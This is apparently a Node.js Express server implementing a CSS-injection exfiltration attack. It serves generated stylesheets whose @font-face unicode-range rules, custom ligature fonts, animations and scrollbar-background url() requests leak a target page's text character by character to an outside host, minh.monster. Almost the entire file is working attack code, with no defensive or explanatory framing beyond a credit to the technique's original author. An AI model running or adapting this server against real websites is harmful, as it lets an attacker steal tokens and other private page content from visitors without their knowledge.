const express = require('express');
const js2xmlparser = require('js2xmlparser');
const fs = require('fs');
const tmp = require('tmp');
const rimraf = require('rimraf');
const child_process = require('child_process');

const app = express();
app.disable('etag');

// Config
const PORT = 3000;
const HOSTNAME = "https://minh.monster";
//let PREFIX = 'willBeSetLater';
let PREFIX = 'willBeSetLater';
const CHARSET = "eoars nidtlcmup.@hbfgvwyjkqxzABCDEFGHIJKLMNOPQRSTUVWXYZ0189234576+!#=$^";
const LOG = 4;
const DEBUG = true;
const DELAY = '1.5s';
const DURATION = '4.5s';
const WIDTH = '392px';
const DEL = '_';
let minSelectorToTarget = "willBeSetLater";
const selectorArray = [];
let firstLetterExfilCSS = "willBeSetLater";

let displaySelectorArray = [];
let minDisplaySelector = "html:not(any0)";

for(let i = 1; i <=100; i++) {
	displaySelectorArray.push(minDisplaySelector += ":not(any" + i + ")");
}


function genSelectorArray() {
	let tmpMinSelectorToTarget = minSelectorToTarget;
	for(let i = 1; i <=100; i++) {
		selectorArray.push(tmpMinSelectorToTarget += ":not(any" + i + ")");
	}

}

function genFirstLetterExfilCSS() {
firstLetterExfilCSS = `
@import '` + HOSTNAME + `/start';

@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=z); /* not fetched */
 unicode-range:U+007A;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=y); /* not fetched */
 unicode-range:U+0079;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=x); /* not fetched */
 unicode-range:U+0078;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=w); /* not fetched */
 unicode-range:U+0077;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=v); /* not fetched */
 unicode-range:U+0076;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=u); /* not fetched */
 unicode-range:U+0075;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=t); /* not fetched */
 unicode-range:U+0074;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=s); /* not fetched */
 unicode-range:U+0073;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=r); /* not fetched */
 unicode-range:U+0072;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=q); /* not fetched */
 unicode-range:U+0071;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=p); /* not fetched */
 unicode-range:U+0070;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=o); /* not fetched */
 unicode-range:U+006F;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=n); /* not fetched */
 unicode-range:U+006E;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=m); /* not fetched */
 unicode-range:U+006D;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=l); /* not fetched */
 unicode-range:U+006C;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=k); /* not fetched */
 unicode-range:U+006B;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=j); /* not fetched */
 unicode-range:U+006A;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=i); /* not fetched */
 unicode-range:U+0069;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=h); /* not fetched */
 unicode-range:U+0068;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=g); /* not fetched */
 unicode-range:U+0067;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=f); /* not fetched */
 unicode-range:U+0066;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=e); /* not fetched */
 unicode-range:U+0065;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=d); /* not fetched */
 unicode-range:U+0064;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=c); /* fetched too */
 unicode-range:U+0063;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=b); /* fetched */
 unicode-range:U+0062;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=a); /* fetched */
 unicode-range:U+0061;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=Z); /* not fetched */
 unicode-range:U+005A;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=Y); /* not fetched */
 unicode-range:U+0059;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=X); /* not fetched */
 unicode-range:U+0058;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=W); /* not fetched */
 unicode-range:U+0057;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=V); /* not fetched */
 unicode-range:U+0056;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=U); /* not fetched */
 unicode-range:U+0055;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=T); /* not fetched */
 unicode-range:U+0054;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=S); /* not fetched */
 unicode-range:U+0053;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=R); /* not fetched */
 unicode-range:U+0052;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=Q); /* not fetched */
 unicode-range:U+0051;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=P); /* not fetched */
 unicode-range:U+0050;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=O); /* not fetched */
 unicode-range:U+004F;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=N); /* not fetched */
 unicode-range:U+004E;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=M); /* not fetched */
 unicode-range:U+004D;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=L); /* not fetched */
 unicode-range:U+004C;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=K); /* not fetched */
 unicode-range:U+004B;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=J); /* not fetched */
 unicode-range:U+004A;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=I); /* not fetched */
 unicode-range:U+0049
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=H); /* not fetched */
 unicode-range:U+0048;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=G); /* not fetched */
 unicode-range:U+0047;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=F); /* not fetched */
 unicode-range:U+0046;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=E); /* not fetched */
 unicode-range:U+0045;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=D); /* not fetched */
 unicode-range:U+0044;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=C); /* not fetched */
 unicode-range:U+0043;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=B); /* fetched too */
 unicode-range:U+0042;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=A); /* fetched */
 unicode-range:U+0041;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=0); /* not fetched */
 unicode-range:U+0030;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=1); /* not fetched */
 unicode-range:U+0031;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=2); /* not fetched */
 unicode-range:U+0032;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=3); /* not fetched */
 unicode-range:U+0033;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=4); /* not fetched */
 unicode-range:U+0034;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=5); /* not fetched */
 unicode-range:U+0035;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=6); /* not fetched */
 unicode-range:U+0036;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=7); /* not fetched */
 unicode-range:U+0037;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=8); /* not fetched */
 unicode-range:U+0038;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=9); /* not fetched */
 unicode-range:U+0039;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=21); /* not fetched */
 unicode-range:U+0021;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=24); /* not fetched */
 unicode-range:U+0024;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=25); /* not fetched */
 unicode-range:U+0025;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=26); /* not fetched */
 unicode-range:U+0026;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=27); /* not fetched */
 unicode-range:U+0027;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=28); /* not fetched */
 unicode-range:U+0028;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=29); /* not fetched */
 unicode-range:U+0029;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=30); /* not fetched */
 unicode-range:U+002A;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=31); /* not fetched */
 unicode-range:U+002B;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=32); /* not fetched */
 unicode-range:U+002C;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=33); /* not fetched */
 unicode-range:U+002D;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=34); /* not fetched */
 unicode-range:U+002E;
}
@font-face{
 font-family:poc;
 src: url(` + HOSTNAME + `/first?c=35); /* not fetched */
 unicode-range:U+002F;
}

` + minSelectorToTarget + `::first-letter {
    font-family: 'poc';
}

`;
}

// thanks to @SecurityMB:
// https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/
function createFont(prefix, charsToLigature) {
    let font = {
        "defs": {
            "font": {
                "@": {
                    "id": "hack",
                    "horiz-adv-x": "0"
                },
                "font-face": {
                    "@": {
                        "font-family": "hack",
                        "units-per-em": "1000"
                    }
                },
                "glyph": []
            }
        }
    };

    let glyphs = font.defs.font.glyph;
    for (let c = 0x20; c <= 0x7e; c += 1) {
        const glyph = {
            "@": {
                "unicode": String.fromCharCode(c),
                "horiz-adv-x": "0",
                "d": "M1 0z",
            }
        };
        glyphs.push(glyph);
    }

    charsToLigature.forEach(c => {
        const glyph = {
            "@": {
                "unicode": prefix + c,
                "horiz-adv-x": "32755",
                "d": "M1 0z",
            }
        }
        glyphs.push(glyph);
    });

    const xml = js2xmlparser.parse("svg", font);

    const tmpobj = tmp.dirSync();
    fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
    child_process.spawnSync("/usr/bin/fontforge", [
        `${__dirname}/script.fontforge`,
        `${tmpobj.name}/font.svg`
    ]);

    const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);

    rimraf.sync(tmpobj.name);

    return woff;
}

// Utils

const encode = e => encodeURIComponent(e).replace(/\./g,'%252E').replace(/'/g, '%27').replace(/!/g, '%21');

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}

function split(str, n=2) {
    return str.match(new RegExp('.{1,'+(Math.ceil(str.length/n))+'}','g'));
}

// CSS generation

// define fonts with src to on-the-fly ligature generation
function genFontFacesCSS (prefix, input, chars) {
    return `@font-face{font-family:empty;src:url(${HOSTNAME}/font/${encode(prefix+input)}/%C2%AC)}` + split(chars, LOG).map((c,i) => `@font-face{font-family:"hack_${input+"_"+c+"_"+i}";src:url(${HOSTNAME}/font/${encode(prefix+input)}/${encode(c)})}`).join('')+'\n';
};

// use animation to iterate over a bunch of different fonts, only leak if one matches (i.e. triggers the scrollbar)
function genAnimation (chars, input, ttl) {
    let chunks = split(chars, LOG);
    let delta = Math.floor(100 / chunks.length / 2);
    return `@keyframes wololo_${n} {\n` +
        chunks.map((e,i) => {
            return `${delta*i*2}%{font-family:empty;--x:0}\n` +
                `${delta*(i*2+1)}%{font-family:"hack_${input+"_"+e+"_"+i}";--x:url(${HOSTNAME}/leak?ttl=${ttl}&pre=${encode(input)}&chars=${encode(e)});}\n`;
        }).join('') +
        `100%{font-family:empty;--x:0}\n` +
        `}\n`;
};

// basic setup for scrollbar detection
function genInjection (selector='.foo', iterations=0, width='450px', delay='1s', duration='5s') {
    return `${[selectorArray[n]]}::first-letter { font-family: unset; }
    ${[selectorArray[n]]}{
    overflow-x: auto;
    width: ${width};
    animation-duration: ${duration};
    animation-delay: ${delay};
    font-family: empty;
    background: lightblue;
    animation-name: wololo_${n};
    z-index: ${iterations};
    letter-spacing: normal !important;
}
${selectorArray[n]}::-webkit-scrollbar {
    background: blue;
}
${selectorArray[n]}::-webkit-scrollbar:horizontal {
    background:var(--x);
}

${displaySelectorArray[n]}:after{
    color: #155724;
	background-color: #d4edda;
	border-color: #c3e6cb;
	padding: 0.75rem 1.25rem;
	border: 1px solid transparent;
    content: "Exfiltrating... \\0a \\0a Exfiltrated: ${PREFIX+input}";
    position:fixed;
    left:0;
    top:100px;
    padding:5px;
    width: 100%;
    height: calc(100% - 100px);
    overflow: auto;
    white-space: pre;
    font-family:Arial;
    box-sizing: border-box;
    z-index: 2147483647;
    }

`;
};


// generate next payload
function genResponse (res, ttl, chars) {
    console.log('...payload ('+ n +'): ' + split(chars, LOG));
    var css =
        '@import url('+ HOSTNAME + '/next?' + Math.random() + ');\n\n' +
        genFontFacesCSS(PREFIX, input, chars) +
        genAnimation(chars, input, ttl) +
        genInjection(minSelectorToTarget, n, WIDTH, DELAY, DURATION);
    res.set({
        //'Cache-Control': 'public, max-age=600',
        'Content-Type': 'text/css',
    });
    res.end(css);
    n = n + 1;
}

// Router & CSS recursive import logic

var pending = [], ready = 0, n = 0, input = "", ttl = 0;

app.get("/font/:prefix/:charsToLigature", (req, res) => {
    const { prefix, charsToLigature } = req.params;
    res.set({
        'Cache-Control': 'public, max-age=600',
        'Content-Type': 'application/x-font-woff',
        'Access-Control-Allow-Origin': '*',
    });
    res.end(createFont(decodeURIComponent(prefix), Array.from(decodeURIComponent(charsToLigature))));
});

function sleepAsync(milliseconds) {
  return new Promise(resolve => setTimeout(resolve, milliseconds));
}


// first request, reset everything
app.get("/start", (req, res) => {
    sleepAsync(1000).then(() => {
	    log("===============================");
	    ready = 1;
	    n = 0;
	    pending = [];
	    chars = CHARSET;
	    input = "";
	    ttl = 0;
	    genResponse(res, ttl, chars);
    });
});


// only keep first response, loop until we get 1 char, then mark as ready or send payload
app.get("/leak", (req, res) => {
    res.sendStatus(200).end();
    req.query.ttl = parseInt(req.query.ttl, 10);
    req.query.pre = decodeURIComponent(req.query.pre);
    req.query.chars = decodeURIComponent(req.query.chars);
    if (req.query.chars && req.query.ttl >= ttl) {
        ttl = ttl + 1;
        if (req.query.chars.length === 1) {
            input += req.query.chars;
            chars = CHARSET; // prepare next binary search
        } else {
            chars = req.query.chars; // keep binary search
        }
        console.log('recv: %s', (PREFIX+input));
    } else {
        return;
    }
    if (ready == 1) {
        genResponse(pending.shift(), ttl, chars);
        ready = 0;
    } else {
	ready++;
        log('\tleak: waiting others...');
    }
});

// send next payload when ready
app.get("/next", (req, res) => {
    if (ready == 1) {
        genResponse(res, ttl, chars);
        ready = 0;
    } else {
        pending.push(res);
        ready++;
        log('\tquery: waiting others...');
    }
});

app.get('/:wildcard/minSelectorToTarget.css', (req, res) => {
	minSelectorToTarget = req.params.wildcard
	console.log(minSelectorToTarget);
	genFirstLetterExfilCSS()
	genSelectorArray();
	res.setHeader('Content-Type', 'text/css');
	res.send(firstLetterExfilCSS);
});

app.get('/index.html', (req, res) => {
	res.sendFile('index.html', {
		root: '.'
	});
});

app.get('/css.css', (req, res) => {
	res.sendFile('css.css', {
		root: '.'
	});
});

app.get('/first', (req, res) => {
	PREFIX = req.query.c;
});


app.listen(PORT, () => {
	console.log(`Listening on ${PORT}...`);
})
